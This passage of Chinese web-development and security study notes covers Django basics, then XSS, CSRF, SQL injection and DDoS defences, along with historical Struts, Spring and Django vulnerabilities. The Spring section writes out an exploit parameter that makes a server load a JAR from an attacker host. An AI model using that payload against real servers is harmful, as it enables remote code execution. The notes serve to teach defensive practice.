然而，Django则期望开发者们定义一张URL pattern和视图函数URL的匹配列表

```python
urlpatterns = [
    url(r'^$', views.index),
    # example: /best/myteamname/5/
    url(r'^(?P<team_name>\w.+?)/(?P<team_number>[0-9]+)/$', views.best),
]
```

##### <font color="yellow">0004 使从请求中获得数据变得简单</font>

数据在HTTP请求中的编码方式有很多种，一个从服务器获得文件或者数据的HTTP GET请求可能会按照URL参数中要求的或者URL结构中的方式进行编码，一个更新服务器上数据的HTTP POST请求则会在请求主体中包含像POST data这样的更新信息，HTTP请求也可能包含客户端cookie中的即时会话和用户信息，web框架提供一个获得这些信息的适合编程语言的机制，比如，Django传递给视图函数的HttpRequest对象包含着获得目标URL的方式和属性、请求的类型(比如一个HTTP GET)、GET或者POST参数、cookie或者session数据等等，Django也可以通过在URL匹配表中定义抓取模式来在URL结构中传递编码了的信息(如上面的编码片段中的最后一行)，

##### <font color="yellow">0005 抽象和简化数据库接口</font>

网站使用数据库来存储与用户分享的信息和用户个人信息，web框架通常会提供一个数据库层来抽象数据库的读、写、查询和删除操作，这一个抽象层被称作对象关系映射器(ORM)

使用对象关系映射器有两个好处

- 你不需要改变使用数据库的代码就可以替换底层数据库

    这就允许开发者依据用途优化不同数据库的特点

- 简单的数据的验证可以被植入到框架中

    这会使得检查数据是否按照正确的方式存储在数据库字段中或者是否是特定的格式变得简单(比如邮箱地址)，并且不是恶意的(黑客可以利用特定的编码模式来进行一些如删除数据库记录的非法操作)

比如，Django框架提供一个对象关系映射，并且将用来定义数据库记录的结构称作模型，模型制定被存储的字段类型，可能也会提供那些要被存储的信息的验证(比如，一个email字段只允许合法email地址)，字段可能也会指明最大信息量、默认值、选项列表、帮助文档、表单标签等，这个模型不会申明任何底层数据库的信息，因为这是一个只能被我们的代码改变的配置信息，下面第一个代码片段展示了一个简单的为Team对象设计的Django模型，这个模型会使用字符字段来存储一个队伍的名字和级别，同时还指定了用来存储每一条记录的最大字符数量，`team_level`是一个枚举字段，所以我们也提供了一个被存储的数据和被展示出来的选项之间的匹配，同时指定了一个默认值

```python
#best/models.py

from django.db import models
class Team(models.Model):
    team_name = models.CharField(max_length=40)
    TEAM_LEVELS = (
        ('U09', 'Under 09s'),
        ('U10', 'Under 10s'),
        ('U11, 'Under 11s'),
        ...  #list our other teams
    )
    team_level = models.CharField(max_length=3,choices=TEAM_LEVELS,default='U11')
```

Django模型提供了简单的搜索数据库的查询API，这可以通过使用不同标准来同时匹配一系列的字段(比如精确、不区分大小写、大于等等)，并且支持一些复杂的陈述(比如，你可以指定在U11水平的队伍中搜索队伍名字中以Fr开头或者al结尾的队伍)，第二个代码片段展示了一个视图函数(资源处理器)，这个视图函数用来展示所有U09水平的队伍——通过指明过滤出所有`team_level`字段能准确匹配U09的队伍(注意过滤规则如何传递给`filter()`)，它被视为一个变量`team_level__exact`，由字段名、匹配类型和分隔它们的双重下划线组成

```python
#best/views.py

from django.shortcuts import render
from .models import Team
def youngest(request):
    list_teams = Team.objects.filter(team_level__exact="U09")
    context = {'youngest_teams': list_teams}
    return render(request, 'best/index.html', context)
```

##### <font color="yellow">0006 渲染数据</font>

web框架经常提供模板系统，这些允许你制定输出文档的结构，使用为那些数据准备的将在页面生成时添加进去的占位符，模板经常是用来生成HTML的，但是也可以用来生成一些其他的文档，框架提供一个机制，使得从存储的数据中生成其他格式数据变得简单，包括JSON和XML，比如，Django模板允许你通过使用双重花括号(如`{{ variable_name }}`)来指定变量，当页面被渲染出来时，这些变量会被从视图函数传递过来的值代替，模板系统也会提供表达支持(通过语法`{% expression %}`来实现)，这样就允许模板进行一些简单的操作比如迭代传递给模板的值列表，下面的代码片段展示了它们如何工作的，下面的内容接着从上一个部分而来的youngest team实例，HTML模板通过视图函数传进一个叫做`youngest_teams`的值列表，在HTML骨架中我们有一个初步检查`youngest_teams`变量是否存在的表示，然后会在for循环里面进行迭代，在每一次迭代中模板会以列表元素的形式展示队伍的`team_name`值

```html
#best/templates/best/index.html

<!DOCTYPE html>
<html lang="en">
    <body>
        {% if youngest_teams %}
            <ul>
            {% for team in youngest_teams %}
                <li>{{ team.team_name }}</li>
            {% endfor %}
            </ul>
        {% else %}
            <p>No teams are available.</p>
        {% endif %}
    </body>
</html>
```

##### <font color="yellow">0007 如何选择一个web框架</font>

几乎对于你想要使用的每一种语言都有大量的web框架(我们在下面的部分列举了一些比较受欢迎的框架)，有这么多选择，导致很难决定选择哪个框架为你的新web应用提供最好的开端

一些影响你决定的因素有

1. 学习代价

> 学习一个web框架取决于你对底层语言的熟悉程度，它的API的一致性与否，文档质量，社区的体量和活跃程度
> 
> 如果你完全没有编程基础的话，那就考虑Django吧(它是基于上面几条标准来看最容易学习的了)
> 
> 如果你已经成为开发团队的一部分，而那个开发团队对某一种语言或者某一个框架有着很重要的开发经历，那么就坚持相关框架

2. 效率

> 效率是指一旦你熟悉某一个框架之后，你能够多块地创造一个新功能的衡量方式，包括编写和维护代码的代价(因为当前面的功能崩掉之后，你没法编写新的功能)
> 
> 影响效率的大多数因素和学习代价是类似的比如，文档，社区，编程经历等等
> 
> 其他因素还有
> 
> 1. 框架目的/起源
> 
>     一些框架最初是用来解决某一类特定问题的，并且最好在生成app的时候顾及到这些约束
> 
>     比如，Django是用来支持新闻网站的，因此非常适合博客或者其他包含发布内容的网站
> 
>     相反的，Flask是一个相对来说轻量级的框架，因此适合用来生成一些在嵌入式设备上运行的app
> 
> 2. Opinionated vs unopinionated
> 
>     一个opinionated的框架是说，解决某一个特定问题时，总有一个被推荐的最佳的解决方法
> 
>     opinionated的框架在你试图解决一些普通问题的时候，更加趋向于产品化，因为它们会将你引入正确的方向，尽管有些时候并不那么灵活
> 
>     一些web框架默认地包含了开发者们能遇到的任何一个问题的工具/库，而一些轻量级的框架希望开发者们自己从分离的库中选择合适的解决方式
> 
>     Django是其前者的一个实例，而(Flask则是轻量级的一个实例)包含了所有东西的框架通常很容易上手因为你已经有了你所需要的任何东西，并且很可能它已经被整合好了，并且文档也写得很完善
> 
>     然而一个较小型的框架含有你所需要(或者以后需要)的各种东西，它将只能在受更多限制的环境中运行，并且需要学习更小的、更简单的子集学习
> 
> 3. 是否选择一个鼓励良好开发实例的框架
> 
>     比如，一个鼓励Model-View-Controller结构来将代码分离到逻辑函数上的框架将会是更加易于维护的代码，想比与那些对开发者没有此期待的框架而言
> 
>     同样的，框架设计也深刻影响了测试和重复使用代码的难易程度

3. 框架/编程语言的表现

> 通常来讲，速度并不是选择中最重要的因素，甚至，相对而言，运行速度很缓慢的Python对于一个在中等硬盘上跑的中等大小的网站已经足够了
> 
> 其他语言(C++/Javascript)的明显的速度优势很有可能被学习和维护的代价给抵消了

4. 缓存支持

> 当你的网站之间变得越来越成功之后，你可能会发现它已经无法妥善处理它收到的大量请求了
> 
> 在这个时候，你可能会开始考虑添加缓存支持
> 
> 缓存是一种优化，是指你将全部的或者大部分的网站请求保存起来，那么在后继请求中就不需要重新计算了
> 
> 返回一个缓存请求比重新计算一次要快得多
> 
> 缓存可以被植入你的代码里面，或者是服务器中参见(reverse proxy)
> 
> web框架对于定义可缓存内容有着不同程度的支持

5. 可扩展性

>  一旦你的网站非常成功的时候，你会发现缓存的好处已经所剩无几了，甚至垂直容量到达了极限(将程序运行在更加有力的硬件上面)
>
>  在这个时候，你可能需要水平扩展(将你的网站分散到好几个服务器和数据库上来加载)或者地理上地扩展，因为你的一些客户距离你的服务器很远
>
>  你所选择的框架将会影响到扩展你的网站的难易程度

6. 网络安全

> 一些web框架对于解决常见的网络攻击提供更好的支持
>
> 例如，Django消除所有用户从HTML输入的东西
>
> 因此从用户端输入的Javascript不会被运行
>
> 其他框架也提供相似的功能，但是通常在默认情况下是不直接开启的

可能还有其他一些原因，包括许可证、框架是否处于动态发展过程中等等，如果你是一个完全的初学者，那么你可能会基于易于学习来选择你的框架，除了语言本身的易于学习之外，帮助新手的高质量的文档/教程和一个活跃的社区是你最有价值的资源，在后续课程中，我们选取了Djnago(Python)和Express(Node/Javascript)来编写我们的实例，主要因为它们很容易上手并且有强大的支持

##### <font color="yellow">0008 几个还不错的框架</font>

下面的服务器端框架体现了现在最受欢迎的几个，它们有你需要用来提升效率的一切东西——它们是开源的，一直保持发展的态势，有着富有激情的社区，社区里的人创作出文档并且在讨论板上帮助使用者，并且被使用在很多高质量的网站上，当然还有很多其他非常棒的框架，你可以使用搜索引擎探索一下，

###### <font color="yellow">a. Django(Python)</font>

Django是一个高水平的python web框架，它鼓励快速的开发和简洁、务实的设计，它由非常有经验的开发者创建的，考虑到了web开发中会遇到的大多数难题，所以你无需重复造轮就能够专心编写你的应用，Django遵循Batteries included哲学，并且提供了几乎所有大多开发者们想要开箱即用的东西，因为它已经包含了所有东西，它作为一个整体一起工作，遵循着一致的设计原则，并且有扩展的、持续更新的文档，它也是非常快、安全和易于扩展的，基于python，Django代码非常容易阅读和维护

使用Django的主流网站(从Django官网首页看到的)包括

- Disqus
- Instagram
- Knight Foundation
- MacArthur Foundation
- Mozilla
- National Geographic
- Open Knowledge Foundation
- Pinterest
- Open Stack

###### <font color="yellow">b. Flask(Python)</font>

Flask是python的一个微型框架，虽然体量很小，Flask却可以开箱即用地创造出完备网站，它包含一个开发服务器和调试器，并且包含对于Jinja2模板的支持, 安全的cookie，unit testing，和RESTful request dispatching，它有很好的文档和一个活跃的社区，Flask已经非常火爆了，部分因为那些需要在小型的、资源受限的系统中提供web服务的开发者们(比如，在Raspberry Pi，Drone controllers等上面运行服务器)，    

###### <font color="yellow">c. Express(Node.js/JavaScript)</font>

Express针对Node.js的快速的、unopinioned、灵活的、小型的web框架(node是用来运行Javascript的无浏览器的环境)，它为web和移动应用提供强大的系列功能，并且传输有用的HTTP工具、方法和middleware，Express非常受欢迎，主要因为它减轻了客户端Javascript程序到服务器端开发的迁移，并且部分因为它是资源节约型(底层的node环境在单线程中使用轻量级多任务处理，而不是为每个web请求提供单独的进程)，因为Express是一个小型的web框架，它几乎不包含任何你可能想要使用的组件(比如，数据库接口和对用户和会话的支持通过独立的库来完成)，有很多独立的、非常好的组件，但是有时候你可能很难决定对于特定目的而言哪一个是最好的，很多非常受欢迎的服务器端编程和全栈框架(同时包括服务器端和客户端框架)，包括 Feathers，ItemsAPI，KeystoneJS，Kraken，LEAN-STACK，LoopBack，MEAN，和Sails，大量的profile company使用Express，包括优步、Accenture、IBM等，

###### <font color="yellow">d. Ruby on Rails(Ruby)</font>

Rails(通常被称作Ruby on Rails)是一个为Ruby语言编写的web框架，Rails遵循了和Django非常相似的设计哲学，正如Django一样，它提供了检索URLs的标准机制、从数据库中访问数据、从模板中生成HTML页面、格式化数据JSON或者XML，同样的，它也鼓励如DRY(不要重复你自己)的设计模板——尽可能地只写一次代码、MVC(模板-视图-控制中心)以及很多其他的一些，当然，还有很多由于因为具体设计决定和语言的特性导致的差异

Rails被用在很多站点中，包括

- Basecamp
- GitHub
- Shopify
- Airbnb
- Twitch
- SoundCloud
- Hulu
- Zendesk
- Square
- Hi
    
###### <font color="yellow">e. ASP.NET</font>

ASP.NET是一个由微软开发的开源Web框架，用于构建现代的Web应用程序和服务，通过ASP.NET你能快速创建基于HTML、CSS、JavaScript的网站，并且能满足大量用户的需求，还可以很容易地添加诸如Web API、数据表单、即时通讯的功能，ASP.NET的特点之一就是它建立在Common Language Runtime(CLR公共语言运行时)之上，这使得程序员可以使用任何支持的.NET语言(如C#、Visual Basic)来编写ASP.NET代码，和很多微软的产品一样，它得益于出色的开发工具(通常是免费的)、活跃的开发者社区，以及详尽的文档，ASP.NET被微软、Xbox、Stack Overflow等采用，

###### <font color="yellow">f. Mojolicious(Perl)</font>

#### <font color="yellow">013 模版引擎与XSS防御</font>

在View层，可以解决XSS问题，跨站脚本攻击阐述了输入检查与输出编码这两种方法在XSS防御效果上的差异，XSS攻击是在用户的浏览器上执行的，其形成过程则是在服务器端页面渲染时，注入了恶意的HTML代码导致的，从MVC架构来说，是发生在View层，因此使用输出编码的防御方法更加合理，这意味着需要针对不同上下文的XSS攻击场景，使用不同的编码方式

我们将输出编码的防御方法总结为以下几种

- 在HTML标签中输出变量
- 在HTML属性中输出变量
- 在script标签中输出变量
- 在事件中输出变量
- 在CSS中输出变量
- 在URL中输出变量

针对不同的情况，使用不同的编码函数，那么现在流行的MVC框架是否符合这样的设计呢?答案是否定的，在当前流行的MVC框架中，View层常用的技术是使用模板引擎对页面进行渲染，比如跨站脚本攻击所提到的Django，就使用了Django Templates作为模板引擎，模板引擎本身，可能会提供一些编码方法，为了方便，很多程序员可能会选择关闭auto-escape，要检查auto-escape是否被关闭也很简单，搜索代码里是否出现上面两种情况即可，但是正如前文所述，最好的XSS防御方案，在不同的场景需要使用不同的编码函数，如果统一使用这5个字符的HtmlEncode，则很可能会被攻击者绕过，由此看来，这种auto-escape的方案，看起来也变得不那么美好了，再看看非常流行的模板引擎Velocity，它也提供了类似的机制，但是有所不同的是，Velocity默认是没有开启HtmlEncode的，但Velocity提供的处理机制，与Django的auto-escape所提供的机制是类似的，都只进行了HtmlEncode，而未细分编码使用的具体场景，不过幸运的是，在模板引擎中，可以实现自定义的编码函数，应用于不同场景，在Django中是使用自定义filters，在Velocity中则可以使用宏(velocimacro)，通过自定义的方法，使得XSS防御的功能得到完善，同时在模板系统中，搜索不安全的变量也有了依据，甚至在代码检测工具中，可以自动判断出需要使用哪一种安全的编码方法，这在安全开发流程中是非常重要的，在其他的模板引擎中，也可以依据是否有细分场景使用不同的编码方式来判断XSS的安全方案是否完整，在很多Web框架官方文档中推荐的用法，就是存在缺陷的，Web框架的开发者在设计安全方案时，有时会缺乏来自安全专家的建议，所以开发者在使用框架时，应该慎重对待安全问题，不可盲从官方指导文档

#### </font color="yellow">014 Web框架与CSRF防御</font>

关于CSRF的攻击原理和防御方案

在Web框架中可以使用security token解决CSRF攻击的问题，CSRF攻击的目标，一般都会产生写数据操作的URL，比如增、删、改，而读数据操作并不是CSRF攻击的目标，因为在CSRF的攻击过程中攻击者无法获取到服务器端返回的数据，攻击者只是借用户之手触发服务器动作，所以读数据对于CSRF来说并无直接的意义(但是如果同时存在XSS漏洞或者其他的跨域漏洞，则可能会引起别的问题，在这里仅仅就CSRF对抗本身进行讨论)，因此，在Web应用开发中，有必要对读操作和写操作予以区分，比如要求所有的写操作都使用HTTP POST，在很多讲述CSRF防御的文章中，都要求使用HTTP POST进行防御，但实际上POST本身并不足以对抗CSRF，因为POST也是可以自动提交的，但是POST的使用，对于保护token有着积极的意义，而security token的私密性(不可预测性原则)，是防御CSRF攻击的基础，对于Web框架来说，可以自动地在所有涉及POST的代码中添加token，这些地方包括所有的form表单、所有的Ajax POST请求等

完整的CSRF防御方案，对于Web框架来说有以下几处地方需要改动

- 在Session中绑定token

    如果不能保存到服务器端Session中，则可以替代为保存到Cookie里

- 在form表单中自动填入token字段

	```html
	<input type=hidden name="anti_csrf_token"value="$token"/>
	```

- 在Ajax请求中自动添加token，这可能需要已有的Ajax封装实现的支持
- 在服务器端对比POST提交参数的token与Session中绑定的token是否一致，以验证CSRF攻击

在Django中也有类似的功能，但是配置稍微要复杂点

- 将django.middleware.csrf.CsrfViewMiddleware添加到MIDDUEWARE_CLASSES中
- 在form表单的模板中添加token
- 确认在View层的函数中使用了django.core.context_processors.csrf，如果使用的是RequestContext，则默认已经使用了，否则需要手动添加

在Ajax请求中，一般是插入一个包含了token的HTTP头，使用HTTP头是为了防止token泄密，因为一般的JavaScript无法获取到HTTP头的信息，但是在存在一些跨域漏洞时可能会出现例外，在Spring MVC以及一些其他的流行Web框架中，并没有直接提供针对CSRF的保护，因此这些功能需要自己实现

#### </font color="yellow">015 HTTP Headers管理</font>

在Web框架中，可以对HTTP头进行全局化的处理，因此一些基于HTTP头的安全方案可以很好地实施，比如针对HTTP返回头的CRLF注入，因为HTTP头实际上可以看成是key-value对，因此对抗CRLF的方案只需要在value中编码所有的`\r`、`\n`即可，这里没有提到在key中编码`\r`、`\n`，是因为让用户能够控制key是极其危险的事情，在任何情况下都不应该使其发生，类似的，针对30X返回号的HTTP Response，浏览器将会跳转到Location指定的URL，攻击者往往利用此类功能实施钓鱼或诈骗，因此，对于框架来说，管理好跳转目的地址是很有必要的

一般来说，可以在两个地方做这件事情

- 如果Web框架提供统一的跳转函数，则可以在跳转函数内部实现一个白名单，指定跳转地址只能在白名单中
- 另一种解决方式是控制HTTP的Location字段，限制Location的值只能是哪些地址，也能起到同样的效果，其本质还是白名单

有很多与安全相关的Headers,也可以统一在Web框架中配置，Web框架可以封装此功能，并提供页面配置

该HTTP头有三个可选的值，适用于各种不同的场景

- SAMEORIGIN
- DENY
- ALLOW-FROM origin

前面曾提到Cookie的HttpOnly Flag，它能告诉浏览器不要让JavaScript访问该Cookie，在Session劫持等问题上有着积极的意义，而且成本非常小，但并不是所有的Web服务器、Web容器、脚本语言提供的API都支持设置HttpOnly Cookie，所以很多时候需要由框架实现一个功能，对所有的Cookie默认添加HttpOnly，不需要此功能的Cookie则单独在配置文件中列出，这将是非常有用的一项安全措施，在框架中实现的好处就是不用担心会有遗漏，就HttpOnly Cookie来说，它要求在所有服务器端设置该Cookie的地方都必须加上，这可能意味着很多不同的业务和页面，只要一个地方有遗漏，就会成为短板，当网站的业务复杂时，登录入又可能就有数十个，兼顾所有Set-Cookie页面会非常麻烦，因此在框架中解决将成为最好的方案，一般来说，框架会提供一个统一的设置Cookie函数，HttpOnly的功能可以在此函数中实现，如果没有这样的函数，则需要统一在HTTP返回头中配置实现

#### <font color="yellow">016 数据持久层与SQL注入</font>

使用ORM(Object/Relation Mapping)框架对SQL注入是有积极意义的，我们知道对抗SQL注入的最佳方式就是使用预编译绑定变量，在实际解决SQL注入时，还有一个难点就是应用复杂后，代码数量庞大，难以把可能存在SQL注入的地方不遗漏地找出来，而ORM框架为我们发现问题提供了一个便捷的途径，以ORM框架ibatis举例，它是基于sqlmap的，生成的SQL语句都结构化地写在XML文件中，ibatis支持动态SQL，可以在SQL语句中插入动态变量，`$value$`，如果用户能够控制这个变量，则会存在一个SQL注入的漏洞，而静态变量`#value#`则是安全的，因此在使用ibatis时，只需要搜索所有的sqlmap文件中是否包含动态变量即可，当业务需要使用动态SQL时，可以作为特例处理，比如在上层的代码逻辑中针对该变量进行严格的控制，以保证不会发生注入问题，而在Django中，做法则更简单，Django提供的Database API，默认已经将所有输入进行了SQL转义，使用Web框架提供的功能，在代码风格上更加统一，也更利于代码审计

#### <font color="yellow">017 其他方案</font>

其实选择是很多的，凡是在Web框架中可能实现的安全方案，只要对性能没有太大的损耗，都应该考虑实施，比如文件上传功能，如果应用实现有问题，可能就会成为严重的漏洞，若是由每个业务单独实现文件上传功能，其设计和代码都会存在差异，复杂情况也会导致安全问题难以控制，但如果在Web框架中能为文件上传功能提供一个足够安全的二方库或者函数 *文件上传漏洞* ，就可以为业务线的开发者解决很多问题，让程序员可以把精力和重点放在功能实现上，Spring Security为Spring MVC的用户提供了许多安全功能，比如基于URL的访问控制、加密方法、证书支持、OpenID支持等，但Spring Security尚缺乏诸如XSS、CSRF等问题的解决方案，在设计整体安全方案时，比较科学的方法是按照第一章中所列举的过程来进行——首先建立威胁模型，然后再判断哪些威胁是可以在框架中得到解决的，在设计Web框架安全解决方案时，还需要保存好安全检查的日志，在设计安全逻辑时也需要考虑到日志的记录，比如发生XSS攻击时，可以记录下攻击者的IP、时间、UserAgent、目标URL、用户名等信息，这些日志，对于后期建立攻击事件分析、入侵分析都是有积极意义的，当然，开启日志也会造成一定的性能损失，因此在设计时，需要考虑日志记录行为的频繁程度，并尽可能避免误报，在设计Web框架安全时，还需要与时俱进，当新的威胁出现时，应当及时完成对应的防御方案，如此一个Web框架才具有生命力，而一些0day漏洞，也有可能通过虚拟补丁的方式在框架层面解决，因为Web框架就像是一层外衣，为Web应用提供了足够的保护和控制力

#### <font color="yellow">018 Web框架自身安全</font>

前面几节讲的都是在Web框架中实现安全方案，但Web框架本身也可能会出现漏洞，只要是程序，就可能出现bug，但是开发框架由于其本身的特殊性，一般网站出于稳定的考虑不会对这个基础设施频繁升级，因此开发框架的漏洞可能不会得到及时的修补，但由此引发的后果却会很严重，研究下面这些案例，可以帮助我们更好地理解框架安全，在使用开发框架时更加的小心，同时让我们不要迷信于开发框架的权威

##### <font color="yellow">0001 Struts 2命令执行漏洞</font>

安全研究者公布了Struts 2一个远程执行代码的漏洞(CVE-2010-1870)，严格来说，这其实是XWork的漏洞，因为Struts 2的核心使用的是Web Work，而WebWork又是使用XWork来处理action的，这个漏洞的细节描述公布在exploit-db上[http://www.exploit-db.com/exploit/14360/](http://www.exploit-db.com/exploit/14360/)，XWork通过`getters/setters`方法从HTTP的参数中获取对应action的名称，这个过程是基于OGNL(Object Graph Navigation Language)的，ParametersInterceptor是不允许参数名称中有`#`的，因为OGNL中的许多预定义变量也是以`#`表示的可是攻击者在过去找到了这样的方法(bug编号XW-641)，使用`\u0023`来代替`#`,这是`#`的十六进制编码，从而构造出可以远程执行的攻击payload，导致代码执行成功

##### <font color="yellow">0002 Struts 2的问题补丁</font>

Struts 2官方目前公布了几个安全补丁[http://struts.apache.org/2.x/docs/security-bulletins.html](http://struts.apache.org/2.x/docs/security-bulletins.html)，但深入其细节不难发现，补丁提交者对于安全的理解是非常粗浅的，以S2-002的漏洞修补为例，这是一个XSS漏洞，发现者当时提交给官方的POC只是构造了script标签

官方新增修补代码

```java
String result = link.toString():

if (result.indexOf("<script>") >= 0)
{
    result = result.replaceAll("<script>","script");
}
```

于是有人发现，如果构造`<<script>>`，经过一次处理后会变为`<script>`，漏洞报告给官方后，开发者再次提交了一个补丁，这次将递归处理类似`<<<<script>>>>`的情况，修补代码仅仅是将if变成while，这种漏洞修补方式，仍然是存在问题的，攻击者可以通过下面的方法绕过，由此可见，Struts 2的开发者，本身对于安全的理解是非常不到位的

##### <font color="yellow">0003 Spring MVC命令执行漏洞</font>

公布了Spring框架一个远程执行命令漏洞，CVE编号是CVE-2010-1622

漏洞影响范围如下

- SpringSource Spring Framework 3.0.0~3.0.2
- SpringSource Spring Framework: 2.5.0~2.5.7

由于Spring框架允许使用客户端所提供的数据来更新对象属性，而这一机制允许攻击者修改`class.classloader`加载对象的类加载器的属性，这可能导致执行任意命令，例如，攻击者可以将类加载器所使用的URL修改到受控的位置

- 创建attack.jar并可通过HTTP URL使用，这个jar必须包含以下内容

    - META-INF/spring-form.tld，定义Spring表单标签并指定实现为标签文件而不是类
    - META-INF/tags/中的标签文件，包含标签定义(任意Java代码)

- 通过以下HTTP参数向表单控制器提交HTTP请求

    ```java
    class.classLoader.URLs[0] = jar:http://attacker/attack.jar!/
    ```

    这会使用攻击者的URL覆盖WebappClassLoader的repositoryURLs属性的第0个元素

- 之后org.apache.jasper.compiler.TldLocationsCache.scanJars()会使用WebappClassLoader的URL解析标签库，会对TLD中所指定的所有标签文件解析攻击者所控制的jar

这个漏洞将直接危害到使用Spring MVC框架的网站，而大多数程序员可能并不会注意到这个问题

##### <font color="yellow">0004 Django命令执行漏洞</font>

在Django 0.95版本中，也出现了一个远程执行命令漏洞，根据官方代码diff后的细节，可以看到这是一个很明显的命令注入漏洞，曾经描述过这种漏洞，Django在处理消息文件时存在问题，远程攻击者构建恶意.po文件，诱使用户访问处理，可导致以应用程序进程权限执行任意命令[http://code.djangoproject.com/changeset/3592](http://code.djangoproject.com/changeset/3592)，这是一个典型的命令注入漏洞，但这个漏洞从利用上来说，意义不是特别大，它的教育意义更为重要

#### <font color="yellow">019 总结</font>

Web框架本身也是应用程序的一个组成部分，只是这个组成部分较为特殊，处于基础和底层的位置，Web框架为安全方案的设计提供了很多便利，好好利用它的强大功能，能够设计出非常优美的安全方案，但我们也不能迷信于Web框架本身，很多Web框架提供的安全解决方案有时并不可靠，我们仍然需要自己实现一个更好的方案，同时Web框架自身的安全性也不可忽视，作为一个基础服务，一旦出现漏洞，影响是巨大的

### <font color="yellow">07 应用层拒绝服务攻击</font>

#### <font color="yellow">001 DDOS简介</font>

DDOS又称为分布式拒绝服务，全称是Distributed Denial of Service，DDOS本是利用合理的请求造成资源过载，导致服务不可用，服务器的负荷过载，不能正常工作了，这种情况就是拒绝服务，分布式拒绝服务攻击，将正常请求放大了若干倍，通过若干个网络节点同时发起攻击，以达成规模效应，这些网络节点往往是黑客们所控制的肉鸡，数量达到一定规模后，就形成了一个僵尸网络，大型的僵尸网络，甚至达到了数万、数十万台的规模，如此规模的僵尸网络发起的DDOS攻击，几乎是不可阻挡的

常见的DDOS攻击

- SYN flood
- UDP flood
- ICMP
- flood
- ...

其中SYN flood是一种最为经典的DDOS攻击，其发现于1996年，但至今仍然保持着非常强大的生命力，SYN flood如此猖獗是因为它利用了TCP协议设计中的缺陷，而TCP/IP协议是整个互联网的基础，牵一发而动全身，如今想要修复这样的缺陷几乎成为不可能的事情

在正常情况下，TCP三次握手过程如下

- 客户端向服务器端发送一个SYN包，包含客户端使用的端又号和初始序列号x
- 服务器端收到客户端发送来的SYN包后，向客户端发送一个SYN和ACK都置位的TCP报文，包含确认号X+1和服务器端的初始序列号y
- 客户端收到服务器端返回的SYN+ACK报文后，向服务器端返回一个确认号为y+i、序号为x+1的ACK报文，一个标准的TCP连接完成

而SYN flood在攻击时，首先伪造大量的源IP地址，分别向服务器端发送大量的SYN包，此时服务器端会返回SYN/ACK包，因为源地址是伪造的，所以伪造的IP并不会应答，服务器端没有收到伪造IP的回应，会重试3~5次并且等待一个SYN Time(—般为30秒至2分钟)，如果超时则丢弃这个连接，攻击者大量发送这种伪造源地址的SYN请求，服务器端将会消耗非常多的资源(CPU和内存)来处理这种半连接，同时还 要不断地对这些IP进行SYN+ACK重试，最后的结果是服务器无暇理睬正常的连接请求，导致拒绝服务，对抗SYN flood的主要措施有SYN Cookie/SYN Proxy、safereset等算法，SYN Cookie的主要思想是为每一个IP地址分配一个Cookie，并统计每个IP地址的访问频率，如果在短时间内收到大量的来自同一个IP地址的数据包，则认为受到攻击，之后来自这个IP地址的包将被丢弃，在很多对抗DDOS的产品中，一般会综合使用各种算法，结合一些DDOS攻击的特征，对流量进行清洗，对抗DDOS的网络设备可以串联或者并联在网络出又处，但DDOS仍然是业界的一个难题，当攻击流量超过了网络设备，甚至带宽的最大负荷时，网络仍将瘫痪，一般来说，大型网站之所以看起来比较能抗DDOS攻击，是因为大型网站的带宽比较充足，集群内服务器的数量也比较多，但一个集群的资源毕竟是有限的，在实际的攻击中，DDOS的流量甚至可以达到数G到几十G，遇到这种情况，只能与网络运营商合作，共同完成DDOS攻击的响应，DDOS的攻击与防御是一个复杂的课题，而本书重点是Web安全，因此对网络层的DDOS攻防在此不做深入讨论，有兴趣的朋友可以自行查阅一些相关资料

#### <font color="yellow">002 应用层DDOS</font>

应用层DDOS，不同于网络层DDOS，由于发生在应用层，因此TCP三次握手已经完成，连接已经建立，所以发起攻击的IP地址也都是真实的，但应用层DDOS有时甚至比网络层DDOS攻击更为可怕，因为今天几乎所有的商业Anti-DDOS设备，只在对抗网络层DDOS时效果较好，而对应用层DDOS攻击却缺乏有效的对抗手段

##### <font color="yellow">0001 CC攻击</font>

CC攻击的前身是一个叫fatboy的攻击程序，当时黑客为了挑战绿盟的一款反DDOS设备开发了它，绿盟是中国著名的安全公司之一，它有一款叫黑洞(Collapasar)的反DDOS设备，能够有效地清洗SYN Flood等有害流量，而黑客则挑衅式地将fatboy所实现的攻击方式命名为ChallengeCollapasar(简称CC)，意指在黑洞的防御下，仍然能有效完成拒绝服务攻击，CC攻击的原理非常简单，就是对一些消耗资源较大的应用页面不断发起正常的请求，以达到消耗服务端资源的目的，在Web应用中，查询数据库、读/写硬盘文件等操作，相对都会消耗比较多的资源，在互联网中充斥着各种搜索引擎、信息收集等系统的爬虫(spider)，爬虫把小网站直接爬死的情况时有发生，这与应用层DDOS攻击的结果很像，由此看来，应用层DDOS攻击与正常业务的界线比较模糊，应用层DDOS攻击还可以通过以下方式完成，在黑客入侵了一个流量很大的网站后，通过篡改页面，将巨大的用户流量分流到目标网站，应用层DDOS攻击是针对服务器性能的一种攻击，那么许多优化服务器性能的方法，都或多或少地能缓解此种攻击，比如将使用频率高的数据放在memcache中，相对于查询数据库所消耗的资源来说，查询memcache所消耗的资源可以忽略不计，但很多性能优化的方案并非是为了对抗应用层DDOS攻击而设计的，因此攻击者想要找到一个资源消耗大的页面并不困难，比如当memcache查询没有命中时，服务器必然会查询数据库，从而增大服务器资源的消耗，攻击者只需要找到这样的页面即可，同时攻击者除了触发读数据操作外，还可以触发写数据操作，写数据的行为一般都会导致服务器操作数据库

##### <font color="yellow">0002 限制请求频率</font>

最常见的针对应用层DDOS攻击的防御措施，是在应用中针对每个客户端做一个请求频率的限制，从架构上看，代码需要放在业务逻辑之前，才能起到保护后端应用的目的，可以看做是一个基层的安全模

限制？不可靠！

> 然而这种防御方法并不完美，因为它在客户端的判断依据上并不是永远可靠的，这个方案中有两个因素用以定位一个客户端，一个是IP地址，另一个是Cookie，但用户的IP地址可能会发生改变，而Cookie又可能会被清空，如果IP地址和Cookie同时都发生了变化，那么就无法再定位到同一个客户端了，使用代理服务器是一个常见的做法，在实际的攻击中，大量使用代理服务器或傀儡机来隐藏攻击者的真实IP地址，已经成为一种成熟的攻击模式，攻击者使用这些方法可不断地变换IP地址，就可以绕过服务器对单个IP地址请求频率的限制了，代理猎手是一个常用的搜索代理服务器的工具，而AccessDiver则已经自动化地实现了这种变换IP地址的攻击，它可以批量导入代理服务器地址，然后通过代理服务器在线暴力破解用户名和密码，攻击者使用的这些混淆信息的手段，都给对抗应用层DDOS攻击带来了很大的困难
> 
> 应用层DDOS攻击并非一个无法解决的难题，一般来说，我们可以从以下几个方面着手
> 
>  - 应用代码要做好性能优化
> 
